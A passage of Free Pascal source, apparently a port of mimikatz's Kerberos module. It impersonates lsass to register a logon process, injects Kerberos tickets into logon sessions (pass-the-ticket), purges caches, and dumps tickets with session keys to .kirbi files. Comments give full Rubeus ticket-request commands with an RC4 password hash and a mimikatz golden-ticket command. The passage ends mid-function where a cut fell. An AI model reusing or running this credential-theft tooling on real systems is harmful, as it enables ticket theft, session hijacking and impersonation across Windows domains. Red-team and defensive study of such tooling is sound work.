unit kerberos;

{$mode delphi}

interface

uses
  windows,SysUtils,
  ntdll,uLSA,
  urunelevatedsupport,
  utils,
  uadvapi32,usecur32;

const
  	//kerberosPackageName:STRING = {8, 9, MICROSOFT_KERBEROS_NAME_A};
	g_AuthenticationPackageId_Kerberos:DWORD = 0;
	g_isAuthPackageKerberos:BOOL = FALSE;
	g_hLSA:HANDLE = 0;

function kuhl_m_kerberos_init:NTSTATUS;
function kuhl_m_kerberos_clean:NTSTATUS;
function kuhl_m_kerberos_use_ticket(fileData:PBYTE;fileSize:DWORD;logonid:int64=0):LONG; //aka import
function kuhl_m_kerberos_purge_ticket(logonid:int64=0):NTSTATUS;
function kuhl_m_kerberos_ask(target:string;export_:bool=false;logonid:int64=0):NTSTATUS;      //aka export
function kuhl_m_kerberos_tgt(logonid:int64=0):NTSTATUS;
function kuhl_m_kerberos_list(logonid:int64=0):NTSTATUS;

function callback_enumlogonsession(param:pointer=nil):dword;stdcall;

implementation

 type

 PCWCHAR = PWCHAR;
 LSA_OPERATIONAL_MODE=ULONG;
 PLSA_OPERATIONAL_MODE=^LSA_OPERATIONAL_MODE;

  //https://www.rdos.net/svn/tags/V9.2.5/watcom/bld/w32api/include/ntsecapi.mh
 //{$PACKENUM 4}
  KERB_PROTOCOL_MESSAGE_TYPE =(
  KerbDebugRequestMessage = 0,
  KerbQueryTicketCacheMessage,
  KerbChangeMachinePasswordMessage,
  KerbVerifyPacMessage,
  KerbRetrieveTicketMessage,
  KerbUpdateAddressesMessage,
  KerbPurgeTicketCacheMessage,
  KerbChangePasswordMessage,
  KerbRetrieveEncodedTicketMessage,
  KerbDecryptDataMessage,
  KerbAddBindingCacheEntryMessage,//10
  KerbSetPasswordMessage,
  KerbSetPasswordExMessage,
  //KerbAddExtraCredentialsMessage {= 17},
  KerbVerifyCredentialsMessage,
  KerbQueryTicketCacheExMessage,
  KerbPurgeTicketCacheExMessage,
  KerbRefreshSmartcardCredentialsMessage,
  KerbAddExtraCredentialsMessage = 17,
  KerbQuerySupplementalCredentialsMessage,
  KerbTransferCredentialsMessage,
  KerbQueryTicketCacheEx2Message, //20
  KerbSubmitTicketMessage,   //21
  KerbAddExtraCredentialsExMessage,
  KerbQueryKdcProxyCacheMessage,
  KerbPurgeKdcProxyCacheMessage,
  KerbQueryTicketCacheEx3Message,
  KerbCleanupMachinePkinitCredsMessage,
  KerbAddBindingCacheEntryExMessage,
  KerbQueryBindingCacheMessage,
  KerbPurgeBindingCacheMessage,
  KerbPinKdcMessage,
  KerbUnpinAllKdcsMessage,
  KerbQueryDomainExtendedPoliciesMessage,
  KerbQueryS4U2ProxyCacheMessage,
  KerbRetrieveKeyTabMessage,
  KerbRefreshPolicyMessage,
  KerbPrintCloudKerberosDebugMessage
);
    PKERB_PROTOCOL_MESSAGE_TYPE=^KERB_PROTOCOL_MESSAGE_TYPE;
    //{$PACKENUM 1}

    //{$PackRecords 8}
      PLSA_STRING=^LSA_STRING;
      _LSA_STRING = record
        Length: USHORT;
        MaximumLength: USHORT;
        {$ifdef CPU64}dummy:dword;{$endif cpu64}
        Buffer: PCHAR;
        //{$PackRecords default}
      end;
      LSA_STRING = _LSA_STRING;


    KERB_CRYPTO_KEY =record
    KeyType:LONG;
    Length:ULONG;
    Value:PUCHAR;
    end;
    PKERB_CRYPTO_KEY=^KERB_CRYPTO_KEY;

    KERB_EXTERNAL_NAME =record
     NameType:SHORT;
     NameCount:USHORT;
     Names:array[0..0] of UNICODE_STRING; //ANYSIZE_ARRAY
    end;
    PKERB_EXTERNAL_NAME=^KERB_EXTERNAL_NAME;

    KERB_EXTERNAL_TICKET =record
     ServiceName:PKERB_EXTERNAL_NAME;
     TargetName:PKERB_EXTERNAL_NAME;
     ClientName:PKERB_EXTERNAL_NAME;
     DomainName:UNICODE_STRING;
     TargetDomainName:UNICODE_STRING;
     AltTargetDomainName:UNICODE_STRING;  // contains ClientDomainName
     SessionKey:KERB_CRYPTO_KEY;
     TicketFlags:ULONG;
     Flags:ULONG;
     KeyExpirationTime:LARGE_INTEGER;
     StartTime:LARGE_INTEGER;
     EndTime:LARGE_INTEGER;
     RenewUntil:LARGE_INTEGER;
     TimeSkew:LARGE_INTEGER;
     EncodedTicketSize:ULONG;
     EncodedTicket:PUCHAR;
end;
    PKERB_EXTERNAL_TICKET=^KERB_EXTERNAL_TICKET;

    SecHandle=record
     dwLower:ULONG_PTR ;
     dwUpper:ULONG_PTR ;
     end;
    PSecHandle=^SecHandle;

 type _LUID =record
    LowPart:DWORD;
    HighPart:LONG;
end;

    KERB_TICKET_CACHE_INFO_EX =record
    ClientName:UNICODE_STRING;
    ClientRealm:UNICODE_STRING;
    ServerName:UNICODE_STRING;
    ServerRealm:UNICODE_STRING;
    StartTime:LARGE_INTEGER;
    EndTime:LARGE_INTEGER;
    RenewTime:LARGE_INTEGER;
    EncryptionType:LONG;
    TicketFlags:ULONG;
end;
    PKERB_TICKET_CACHE_INFO_EX=^KERB_TICKET_CACHE_INFO_EX;

    KERB_QUERY_TKT_CACHE_EX_RESPONSE =record
    MessageType:KERB_PROTOCOL_MESSAGE_TYPE; //dword?
    CountOfTickets:ULONG;
    Tickets:array [0..0] of KERB_TICKET_CACHE_INFO_EX;
end;
    PKERB_QUERY_TKT_CACHE_EX_RESPONSE=^KERB_QUERY_TKT_CACHE_EX_RESPONSE;

    KERB_QUERY_TKT_CACHE_REQUEST =record
    MessageType:KERB_PROTOCOL_MESSAGE_TYPE; //dword?
    LogonId:_LUID;
end;
    PKERB_QUERY_TKT_CACHE_REQUEST=^KERB_QUERY_TKT_CACHE_REQUEST;

    KERB_RETRIEVE_TKT_REQUEST =record
    MessageType:KERB_PROTOCOL_MESSAGE_TYPE;
    LogonId:_LUID;
    TargetName:UNICODE_STRING;
    TicketFlags:ULONG;
    CacheOptions:ULONG;
    EncryptionType:LONG;
    CredentialsHandle:SecHandle;
    end;
    PKERB_RETRIEVE_TKT_REQUEST=^KERB_RETRIEVE_TKT_REQUEST;

  KERB_RETRIEVE_TKT_RESPONSE =record
     Ticket:KERB_EXTERNAL_TICKET;
  end;
  PKERB_RETRIEVE_TKT_RESPONSE=^KERB_RETRIEVE_TKT_RESPONSE;


    KERB_PURGE_TKT_CACHE_REQUEST =record
       MessageType:KERB_PROTOCOL_MESSAGE_TYPE;
       LogonId:_LUID;
       ServerName:UNICODE_STRING;
       RealmName:UNICODE_STRING;
    end;
    PKERB_PURGE_TKT_CACHE_REQUEST=^KERB_PURGE_TKT_CACHE_REQUEST;

    KIWI_KERBEROS_BUFFER =record
    	Length:ULONG;
    	Value:PUCHAR;
    end;
    PKIWI_KERBEROS_BUFFER=^KIWI_KERBEROS_BUFFER;

    KIWI_KERBEROS_TICKET=record
    	ServiceName:PKERB_EXTERNAL_NAME;
    	DomainName:UNICODE_STRING; //LSA_UNICODE_STRING;
    	TargetName:PKERB_EXTERNAL_NAME;
    	TargetDomainName:UNICODE_STRING; //LSA_UNICODE_STRING;
    	ClientName:PKERB_EXTERNAL_NAME;
    	AltTargetDomainName:UNICODE_STRING; //LSA_UNICODE_STRING;

    	Description:UNICODE_STRING; //LSA_UNICODE_STRING;

    	StartTime:FILETIME;
    	EndTime:FILETIME;
    	RenewUntil:FILETIME;

    	KeyType:LONG;
    	Key:KIWI_KERBEROS_BUFFER;

    	TicketFlags:ULONG;
    	TicketEncType:LONG;
    	TicketKvno:ULONG;
    	Ticket:KIWI_KERBEROS_BUFFER;
    end;
    PKIWI_KERBEROS_TICKET=^KIWI_KERBEROS_TICKET;


    KERB_CRYPTO_KEY32 = record
    KeyType:LONG;
    Length:ULONG;
    Offset:ULONG;
end;
    PKERB_CRYPTO_KEY32=^KERB_CRYPTO_KEY32;

    KERB_SUBMIT_TKT_REQUEST = packed record  //needs to be 36 bytes
     MessageType: dword; //KERB_PROTOCOL_MESSAGE_TYPE;
     LogonId: _LUID;
     Flags: ULONG;
     Key: KERB_CRYPTO_KEY32;
     KerbCredSize: ULONG;
     KerbCredOffset: ULONG;
end;
    PKERB_SUBMIT_TKT_REQUEST=^KERB_SUBMIT_TKT_REQUEST;




 //https://docs.microsoft.com/en-usSTATUS_UNSUCCESSFUL/windows/win32/api/ntsecapi/nf-ntsecapi-lsacallauthenticationpackage
  function LsaCallAuthenticationPackage(
       LsaHandle:handle;       //[in]  HANDLE
       AuthenticationPackage:ulong;  //[in]  ULONG
       ProtocolSubmitBuffer:PVOID;    //[in]  PVOID
       SubmitBufferLength:ulong;       //[in]  ULONG
       ProtocolReturnBuffer:ppvoid;         //[out] PVOID
       ReturnBufferLength:pulong;         //[out] PULONG
       ProtocolStatus:PNTSTATUS             //[out] PNTSTATUS
):NTSTATUS external 'secur32.dll';

 function  LsaConnectUntrusted( LsaHandle:PHANDLE):NTSTATUS external 'secur32.dll';

 function LsaLookupAuthenticationPackage(
      LsaHandle:HANDLE;
      PackageName:PLSA_STRING;
      AuthenticationPackage:PULONG
):NTSTATUS external 'secur32.dll';

function LsaRegisterLogonProcess(
    LogonProcessName:PLSA_STRING;
    LsaHandle:PHANDLE;
    SecurityMode:PLSA_OPERATIONAL_MODE
 ):NTSTATUS external 'secur32.dll';

 function LsaDeregisterLogonProcess(LsaHandle:HANDLE):NTSTATUS external 'secur32.dll';

 function LsaFreeReturnBuffer (buffer : pointer) : NTSTATUS; stdcall; external 'secur32.dll';

const
STATUS_HANDLE_NO_LONGER_VALID=$C0190028;
STATUS_UNSUCCESSFUL=$c0000001;

// Ticket Flags
 KERB_USE_DEFAULT_TICKET_FLAGS       =$0;

// CacheOptions
 KERB_RETRIEVE_TICKET_DEFAULT           =$0;
 KERB_RETRIEVE_TICKET_DONT_USE_CACHE    =$1;
 KERB_RETRIEVE_TICKET_USE_CACHE_ONLY    =$2;
 KERB_RETRIEVE_TICKET_USE_CREDHANDLE    =$4;
 KERB_RETRIEVE_TICKET_AS_KERB_CRED      =$8;
 KERB_RETRIEVE_TICKET_WITH_SEC_CRED    =$10;
 KERB_RETRIEVE_TICKET_CACHE_TICKET     =$20;

 KERB_ETYPE_NULL                                    =0;
 KERB_ETYPE_DEFAULT                                 =0;
 KERB_ETYPE_DES_CBC_MD5_NT                          =20;
 KERB_ETYPE_RC4_HMAC_NT                             =23;
 KERB_ETYPE_RC4_HMAC_NT_EXP                         =24;

 STATUS_NO_TRUST_SAM_ACCOUNT= $C000018B;

 SEC_E_NO_CREDENTIALS      =$8009030E;

function callback_enumlogonsession(param:pointer=nil):dword;stdcall;
begin
  if param<>nil then
     begin
             //log('LUID:'+inttohex(int64(PSECURITY_LOGON_SESSION_DATA(param)^.LogonId) ,8),1);
             kuhl_m_kerberos_list (int64(PSECURITY_LOGON_SESSION_DATA(param)^.LogonId));
     end;
end;

function UNICODE_STRING_to_ANSISTRING(input:UNICODE_STRING):ansistring;
var s:ansistring;
begin
     log('******* UNICODE_STRING_to_ANSISTRING *******');
     //log(input.Length );
     s:=strpas(input.Buffer );
     s:=copy(s,1,input.Length div 2 );
     result:=s;
     //log(s);
end;

function kuhl_m_kerberos_init:NTSTATUS;
var
  status:NTSTATUS;
  kerberosPackageName:LSA_STRING ;
  ProcessName:LSA_STRING ;
  securitymode:LSA_OPERATIONAL_MODE=0;
  old:boolean;
begin
        log('******* kuhl_m_kerberos_init **********');

        ProcessName.Length :=8;
        ProcessName.MaximumLength :=9;
        ProcessName.Buffer :='Minlogon' ;
        //0xC0000041 STATUS_PORT_CONNECTION_REFUSED
        //0xC000007C STATUS_NO_TOKEN
        if iselevated=true
                then
                begin
                log('iselevated=true');
                log('impersonatepid:'+booltostr(impersonatepid (lsass_pid)));
                status:=LsaRegisterLogonProcess(@ProcessName,@g_hLSA,@securitymode);
                RevertToSelf;
                {if status=$C0000041 then
                   begin
                   log('trying RtlAdjustPrivilege');
                   Status := RtlAdjustPrivilege(ulong(SeTcbPrivilege), TRUE, false, @Old); //and try again
                   //log('SeTcbPrivilege:'+booltostr(EnableDebugPriv('SeTcbPrivilege')));
                   if status=0
                      then status:=LsaRegisterLogonProcess(@ProcessName,@g_hLSA,@securitymode)
                      else log('RtlAdjustPrivilege failed:'+inttohex(status,8));
                   end}
                end
                else status := LsaConnectUntrusted(@g_hLSA);

	if status=STATUS_SUCCESS then
	begin
                log('LsaLookupAuthenticationPackage...');
                fillchar(kerberosPackageName ,sizeof(kerberosPackageName),0);
                kerberosPackageName.Length :=8;
                kerberosPackageName.MaximumLength :=9;
                kerberosPackageName.Buffer :='Kerberos' ;
		status := LsaLookupAuthenticationPackage(g_hLSA, @kerberosPackageName, @g_AuthenticationPackageId_Kerberos);
                log('status:'+inttohex(status,8));
                g_isAuthPackageKerberos := status=STATUS_SUCCESS;
        end
        else log('kuhl_m_kerberos_init failed:'+inttohex(status,8),1);
	result:= status;
end;



function kuhl_m_kerberos_clean:NTSTATUS;
begin
        log('******* kuhl_m_kerberos_clean **********');
	result:= LsaDeregisterLogonProcess(g_hLSA);
end;



function LsaCallKerberosPackage( ProtocolSubmitBuffer:PVOID;  SubmitBufferLength:ULONG; ProtocolReturnBuffer:PPVOID;  ReturnBufferLength:PULONG; ProtocolStatus:PNTSTATUS):ntstatus;
var
  status:NTSTATUS;
begin

	 status:= STATUS_HANDLE_NO_LONGER_VALID;
	//if(g_hLSA && g_isAuthPackageKerberos)
	            status := LsaCallAuthenticationPackage(g_hLSA, g_AuthenticationPackageId_Kerberos, ProtocolSubmitBuffer, SubmitBufferLength, ProtocolReturnBuffer, ReturnBufferLength, ProtocolStatus);
	result:= status;
end;

//to obtain a tgt ticket and import it with /ptt
//Rubeus.exe asktgt /user:user1 /rc4:64F12CDDAA88057E06A81B54E73B949B /dc:192.168.1.121 /domain:home.lab /outfile:ticket.kirbi /ptt
//to obtain a tgs ticket and import it with /ptt (note that we can also export a tgs ticket with /outfile)
//Rubeus.exe asktgs /service:cifs/WIN-BBC4BS466Q5.home.lab /dc:WIN-BBC4BS466Q5.home.lab /domain:home.lab /ptt /ticket:ticket.kirbi
//Rubeus.exe asktgs /service:LDAP/WIN-BBC4BS466Q5.home.lab,cifs/WIN-BBC4BS466Q5.home.lab /dc:WIN-BBC4BS466Q5.home.lab /domain:home.lab /ptt /ticket:ticket.kirbi
//to list tickets
//rubeus triage or klist or kerberos::tickets (mimikatz)
//you can test a tgs ticket with
//dir \\WIN-BBC4BS466Q5.home.lab\temp provided that temp is a shared folder where user1 has access
//note1: you only need to import the tgs although important the tgt does not harm
//note2: we could create a netonly extra session and provide the new session LUID to not alter current session...
//note3 :
//https://blog.gentilkiwi.com/securite/mimikatz/pass-the-ticket-kerberos
//"Il suffit de demander la parcours d’un partage pour qu’un Ticket de service ad hoc soit demandé en se basant sur le TGT injecté."
//pas le meme comportement : il faut importer un tgs pour pouvoir utiliser un service distant
//note4 : create a tgs ticket without creating a tgt first ?
//kerberos::golden /domain:home.lab /rc4:64F12CDDAA88057E06A81B54E73B949B /user:user1 /service:cifs /target:WIN-BBC4BS466Q5.home.lab
//->expired?
function kuhl_m_kerberos_use_ticket(fileData:PBYTE;fileSize:DWORD;logonid:int64=0):LONG;
var
status:NTSTATUS = STATUS_UNSUCCESSFUL;
packageStatus:NTSTATUS;
submitSize, responseSize:DWORD;
pKerbSubmit:PKERB_SUBMIT_TKT_REQUEST;
dumPtr:PVOID;
begin
log('********* kuhl_m_kerberos_use_ticket *************');
log('fileSize:'+inttostr(fileSize));
//log('sizeof(KERB_PROTOCOL_MESSAGE_TYPE):'+inttostr(sizeof(KERB_PROTOCOL_MESSAGE_TYPE))); //should be 4. see packenum directive
//log('sizeof(KERB_CRYPTO_KEY32):'+inttostr(sizeof(KERB_CRYPTO_KEY32)));
//log('sizeof(KERB_SUBMIT_TKT_REQUEST):'+inttostr(sizeof(KERB_SUBMIT_TKT_REQUEST))); //should be 36


	submitSize := sizeof(KERB_SUBMIT_TKT_REQUEST) + fileSize;
        pKerbSubmit := AllocMem(submitSize);
        log('submitSize:'+inttostr(submitSize));
	if pKerbSubmit <>nil then
        begin
                if logonid<>0 then
                   begin
                   pKerbSubmit^.LogonId.HighPart :=_LUID(logonid).HighPart ;
                   pKerbSubmit^.LogonId.LowPart :=_LUID(logonid).LowPart ;
                   log('LUID:'+inttohex(logonid,8));
                   end;
                pKerbSubmit^.MessageType := dword(KerbSubmitTicketMessage);
		pKerbSubmit^.KerbCredSize := fileSize;
		pKerbSubmit^.KerbCredOffset := sizeof(KERB_SUBMIT_TKT_REQUEST);
                //log('KerbCredOffset:'+inttostr(pKerbSubmit^.KerbCredOffset)); //should be 36
		//RtlCopyMemory((PBYTE) pKerbSubmit + pKerbSubmit->KerbCredOffset, fileData, pKerbSubmit->KerbCredSize);
                CopyMemory(pointer(nativeuint(pKerbSubmit)+ pKerbSubmit^.KerbCredOffset),fileData,pKerbSubmit^.KerbCredSize);

		status := LsaCallKerberosPackage(pKerbSubmit, submitSize, @dumPtr, @responseSize, @packageStatus);
		if status=STATUS_SUCCESS then
		begin
			if packageStatus=STATUS_SUCCESS then
			begin
                                if logonid<>0
                                        then log('Ticket successfully submitted for session '+inttohex(logonid,8),1)
                                        else log('Ticket successfully submitted for current session',1);
				status := STATUS_SUCCESS;
                        end
			else log('LsaCallAuthenticationPackage KerbSubmitTicketMessage / Package : '+inttohex( packageStatus,8));
                end
                //https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55
                //C0000140 STATUS_INVALID_CONNECTION
                //C0000061 STATUS_PRIVILEGE_NOT_HELD
                //C000005F STATUS_NO_SUCH_LOGON_SESSION
                //C000005E STATUS_NO_LOGON_SERVERS
		else log('LsaCallAuthenticationPackage KerbSubmitTicketMessage : '+inttohex( status,8),1);

		freemem(pKerbSubmit);
	end;

	result:= status;
end;

function kuhl_m_kerberos_purge_ticket(logonid:int64=0):NTSTATUS;
var
status, packageStatus:NTSTATUS;
kerbPurgeRequest:KERB_PURGE_TKT_CACHE_REQUEST; //= (KerbPurgeTicketCacheMessage, (0, 0), (0, 0, nil), (0, 0, nil));
 dumPtr:PVOID;
 responseSize:DWORD;
begin
 log('******* kuhl_m_kerberos_purge_ticket *******');
 fillchar(kerbPurgeRequest ,sizeof(kerbPurgeRequest),0);

 if logonid<>0 then
    begin
    kerbPurgeRequest.LogonId.HighPart  :=_luid(logonid).HighPart ;
    kerbPurgeRequest.LogonId.LowPart  :=_luid(logonid).LowPart ;
    log('LUID:'+inttohex(LogonId,8));
    end;
 kerbPurgeRequest.MessageType :=KerbPurgeTicketCacheMessage;


	status := LsaCallKerberosPackage(@kerbPurgeRequest, sizeof(KERB_PURGE_TKT_CACHE_REQUEST), @dumPtr, @responseSize, @packageStatus);
	if status=STATUS_SUCCESS then
	begin
		if packageStatus=STATUS_SUCCESS
                then
                    begin
                    if logonid<>0
                            then log('Ticket(s) purge for session '+inttohex(logonid,8)+' is OK',1)
                            else log('Ticket(s) purge for current session is OK',1);

                    end
                else log('LsaCallAuthenticationPackage KerbPurgeTicketCacheMessage / Package : '+inttohex(packageStatus,8),1);
	end
	else log('LsaCallAuthenticationPackage KerbPurgeTicketCacheMessage : ' +inttohex(status,8),1);
        //C000005F STATUS_NO_SUCH_LOGON_SESSION
        //0xC0000140 STATUS_INVALID_CONNECTION
	result:= STATUS_SUCCESS;
end;

function kull_m_file_writeData(fileName:pchar;  data:LPCVOID;  lenght:DWORD):BOOL;
var
	 reussite:BOOL = FALSE;
	 dwBytesWritten:DWORD = 0; i:dword;
	 hFile:HANDLE = 0;
	 //base64:LPWSTR;
begin
        log('******* kull_m_file_writeData *******');
        log('filename:'+strpas(filename));
        log('lenght:'+inttostr(lenght));
        hFile:=CreateFile(fileName, GENERIC_WRITE, 0, nil, CREATE_ALWAYS, 0, 0);
	if hFile <> INVALID_HANDLE_VALUE then
	begin
		if (WriteFile(hFile, data^, lenght, dwBytesWritten, nil) and (lenght = dwBytesWritten))
                                then reussite := FlushFileBuffers(hFile);
		CloseHandle(hFile);
                log('dwBytesWritten:'+inttostr(dwBytesWritten));
	end;
	result:= reussite;
end;

function kull_m_string_displayFileTime( pFileTime:PFILETIME):string;
var
	 st:SYSTEMTIME;
	 buffer:array[0..254] of widechar;
begin
        log('******* kull_m_string_displayFileTime *******');
	if pFileTime<>NIL then

		if FileTimeToSystemTime(pFileTime, @st ) then
                result:=(DateTimeToStr ( SystemTimeToDateTime(st)));


end ;

function kull_m_string_displayLocalFileTime(pFileTime:PFILETIME):string;
var
 	ft:FILETIME;
begin
        log('******* kull_m_string_displayLocalFileTime *******');
	if pFileTime<>nil then
		if FileTimeToLocalFileTime(pFileTime, @ft) then
			result:=kull_m_string_displayFileTime(@ft);
end;


procedure kuhl_m_kerberos_ticket_display(ticket:PKIWI_KERBEROS_TICKET;  withKey:BOOL;  encodedTicketToo:BOOL);
var
i:integer;
s:string;
begin
        log('******* kuhl_m_kerberos_ticket_display *******');
        log('StartTime:'+kull_m_string_displayLocalFileTime(@ticket^.StartTime),1);
        log('EndTime:'+kull_m_string_displayLocalFileTime(@ticket^.EndTime),1);
        log('RenewUntil:'+kull_m_string_displayLocalFileTime(@ticket^.RenewUntil),1);

        if (ticket^.ServiceName<>nil) and (ticket^.ServiceName^.NameCount >=1) then
           begin
           s:='';
           for i:=0 to ticket^.ServiceName.NameCount-1  do
               begin
               s:=s+UNICODE_STRING_to_ANSISTRING (ticket^.ServiceName.Names [i])+'/';  //copy(strpas(ticket^.ServiceName.Names [i].Buffer),1,ticket^.ServiceName.Names [i].Length div 2 ) +'/';
               end;
           delete(s,length(s),1);
           log('ServiceName: '+ s , 1);

           end;
        if (ticket^.TargetName<>nil) and (ticket^.TargetName^.NameCount >=1) then log('TargetName:  '+ UNICODE_STRING_to_ANSISTRING(ticket^.TargetName.Names [0]) , 1);
        if (ticket^.ClientName<>nil) and (ticket^.ClientName^.NameCount >=1) then log('ClientName:  '+ UNICODE_STRING_to_ANSISTRING (ticket^.ClientName.Names [0]) , 1);

        if (ticket^.Description.Buffer<>nil) then log('Description:'+strpas(ticket^.Description.Buffer),1);

        log('Flags: '+inttohex(ticket^.TicketFlags,8),1);

        log('KeyType: '+inttohex(ticket^.KeyType  ,8),1);
        if (ticket^.Key.Value<>nil) then log('Key:'+ByteToHexaString (ticket^.Key.Value, ticket^.Key.Length),1);

        log('TicketEncType: '+inttohex(ticket^.TicketEncType ,8),1);
        if (ticket^.Ticket.Value <>nil) then log('Ticket:'+ByteToHexaString (ticket^.Ticket.Value, ticket^.Key.Length),1);

end;



//kerberos::ask /target:cifs/WIN-BBC4BS466Q5.home.lab
//kerberos::ask /target:cifs/WIN-BBC4BS466Q5.home.lab
function kuhl_m_kerberos_ask(target:string;export_:bool=false;logonid:int64=0):NTSTATUS;
var
	status, packageStatus:NTSTATUS;
	filename:string ; ticketname:PWCHAR = nil;
	szTarget:PCWCHAR;
	pKerbRetrieveRequest:PKERB_RETRIEVE_TKT_REQUEST;
	pKerbRetrieveResponse:PKERB_RETRIEVE_TKT_RESPONSE;
	ticket:KIWI_KERBEROS_TICKET; // = {0};
	szData:DWORD;
	dwTarget:USHORT;
	isExport:BOOL=false; //kull_m_string_args_byName(argc, argv, L"export", NULL, NULL),
        isTkt:BOOL=false; //kull_m_string_args_byName(argc, argv, L"tkt", NULL, NULL),
        isNoCache:BOOL=false; //kull_m_string_args_byName(argc, argv, L"nocache", NULL, NULL);
begin
        log('******* kuhl_m_kerberos_ask *******');
        isexport:=export_;
        //log('sizeof(KERB_RETRIEVE_TKT_REQUEST):'+inttostr(sizeof(KERB_RETRIEVE_TKT_REQUEST)));
        //log('sizeof(KERB_RETRIEVE_TKT_RESPONSE):'+inttostr(sizeof(KERB_RETRIEVE_TKT_RESPONSE)));
        //log('sizeof(KIWI_KERBEROS_TICKET):'+inttostr(sizeof(KIWI_KERBEROS_TICKET)));
        fillchar(ticket,sizeof(ticket),0);
        szTarget:=pwidechar(widestring(target));
	if target<>'' then
	begin
		dwTarget := (length(szTarget) + 1) * sizeof(widechar);
                log('dwTarget:'+inttostr(dwTarget));

		szData := sizeof(KERB_RETRIEVE_TKT_REQUEST) + dwTarget;
                log('szData:'+inttostr(szData));

                //log('KerbRetrieveEncodedTicketMessage:'+inttostr(dword(KerbRetrieveEncodedTicketMessage)));

                pKerbRetrieveRequest:=allocmem(szData);
		if pKerbRetrieveRequest <>nil then
		begin
                        if logonid<>0 then
                           begin
                           pKerbRetrieveRequest^.LogonId.HighPart  :=_luid(logonid).HighPart ;
                           pKerbRetrieveRequest^.LogonId.LowPart  :=_luid(logonid).LowPart ;
                           log('LUID:'+inttohex(LogonId,8));
                           end;
			pKerbRetrieveRequest^.MessageType := KerbRetrieveEncodedTicketMessage;
			pKerbRetrieveRequest^.CacheOptions :=  KERB_RETRIEVE_TICKET_DEFAULT; //isNoCache ? KERB_RETRIEVE_TICKET_DONT_USE_CACHE : KERB_RETRIEVE_TICKET_DEFAULT;
			pKerbRetrieveRequest^.EncryptionType := KERB_ETYPE_DEFAULT; //KERB_ETYPE_RC4_HMAC_NT; // : kull_m_string_args_byName(argc, argv, L'des', NULL, NULL) ? KERB_ETYPE_DES3_CBC_MD5 : kull_m_string_args_byName(argc, argv, L'aes256', NULL, NULL) ? KERB_ETYPE_AES256_CTS_HMAC_SHA1_96 : kull_m_string_args_byName(argc, argv, L'aes128', NULL, NULL) ? KERB_ETYPE_AES128_CTS_HMAC_SHA1_96 : KERB_ETYPE_DEFAULT;
			pKerbRetrieveRequest^.TargetName.Length := dwTarget - sizeof(widechar);
			pKerbRetrieveRequest^.TargetName.MaximumLength  := dwTarget;
			pKerbRetrieveRequest^.TargetName.Buffer := pointer(nativeuint(pKerbRetrieveRequest) + sizeof(KERB_RETRIEVE_TKT_REQUEST));
			//RtlCopyMemory(pKerbRetrieveRequest^.TargetName.Buffer, szTarget, pKerbRetrieveRequest^.TargetName.MaximumLength);
                        copymemory(pKerbRetrieveRequest^.TargetName.Buffer,szTarget,pKerbRetrieveRequest^.TargetName.MaximumLength);
			log('Asking for: '+ strpas(pKerbRetrieveRequest^.TargetName.Buffer),1 );

			status := LsaCallKerberosPackage(pKerbRetrieveRequest, szData, @pKerbRetrieveResponse, @szData, @packageStatus);
			if status=0 then
			begin
				if packageStatus=0 then
				begin
					ticket.ServiceName := pKerbRetrieveResponse^.Ticket.ServiceName;
					ticket.DomainName := pKerbRetrieveResponse^.Ticket.DomainName;
					ticket.TargetName := pKerbRetrieveResponse^.Ticket.TargetName;
					ticket.TargetDomainName := pKerbRetrieveResponse^.Ticket.TargetDomainName;
					ticket.ClientName := pKerbRetrieveResponse^.Ticket.ClientName;
					ticket.AltTargetDomainName := pKerbRetrieveResponse^.Ticket.AltTargetDomainName;

					ticket.StartTime := filetime(pKerbRetrieveResponse^.Ticket.StartTime);
					ticket.EndTime := filetime(pKerbRetrieveResponse^.Ticket.EndTime);
					ticket.RenewUntil := filetime(pKerbRetrieveResponse^.Ticket.RenewUntil);

					ticket.KeyType := pKerbRetrieveResponse^.Ticket.SessionKey.KeyType;
                                        ticket.TicketEncType:=pKerbRetrieveResponse^.Ticket.SessionKey.KeyType;
					ticket.Key.Length := pKerbRetrieveResponse^.Ticket.SessionKey.Length;
					ticket.Key.Value := pKerbRetrieveResponse^.Ticket.SessionKey.Value;

					ticket.TicketFlags := pKerbRetrieveResponse^.Ticket.TicketFlags;
					ticket.Ticket.Length := pKerbRetrieveResponse^.Ticket.EncodedTicketSize;
					ticket.Ticket.Value := pKerbRetrieveResponse^.Ticket.EncodedTicket;

					log('   * Ticket Encryption Type & kvno not representative at screen\n');
					//if(isNoCache or isExport) then
					log('   * NoCache: exported ticket may vary with informations at screen\n');
					kuhl_m_kerberos_ticket_display(@ticket, TRUE, FALSE);

                                        {
					if isTkt then
						if(ticketname = kuhl_m_kerberos_generateFileName_short(&ticket, L'tkt')) then
						begin
							if(kull_m_file_writeData(ticketname, pKerbRetrieveResponse^.Ticket.EncodedTicket, pKerbRetrieveResponse^.Ticket.EncodedTicketSize))
								kprintf(L'\n   * TKT to file       : %s', ticketname);
							else log_AUTO(L'kull_m_file_writeData');
							LocalFree(ticketname);
						end;
                                        }

					//if isExport then filename = kuhl_m_kerberos_generateFileName_short(&ticket, MIMIKATZ_KERBEROS_EXT);

					LsaFreeReturnBuffer(pKerbRetrieveResponse);

					if isExport then
					begin
						pKerbRetrieveRequest^.CacheOptions:= pKerbRetrieveRequest^.CacheOptions or  KERB_RETRIEVE_TICKET_AS_KERB_CRED;
						status:=LsaCallKerberosPackage(pKerbRetrieveRequest, szData, @pKerbRetrieveResponse, @szData, @packageStatus);
						if status=0 then
						begin
							if packageStatus=0 then
							begin
                                                        filename:='ticket.kirbi';
                                                        filename:=inttohex(ticket.TicketFlags,8)+'-'+UNICODE_STRING_to_ANSISTRING(ticket.ClientName^.Names[0]) +'@'+UNICODE_STRING_to_ANSISTRING(ticket.ServiceName^.Names[0]) +'-'+UNICODE_STRING_to_ANSISTRING(ticket.ServiceName^.Names[1]) +'.kirbi';
                                                        //filename:=string(strpas(ticket.ClientName.Names [0].Buffer)+'.kirbi') ;
								if(kull_m_file_writeData(pchar(filename), pKerbRetrieveResponse^.Ticket.EncodedTicket, pKerbRetrieveResponse^.Ticket.EncodedTicketSize))
									then log('* KiRBi to file:'+ filename,1)
								        else log('kull_m_file_writeData failed',1);
								LsaFreeReturnBuffer(pKerbRetrieveResponse);
							end
							else log('LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage / Package :'+inttohex(packageStatus,8),1);
						end
						else log('LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage :'+inttohex(status,8),1);
					end;


				end
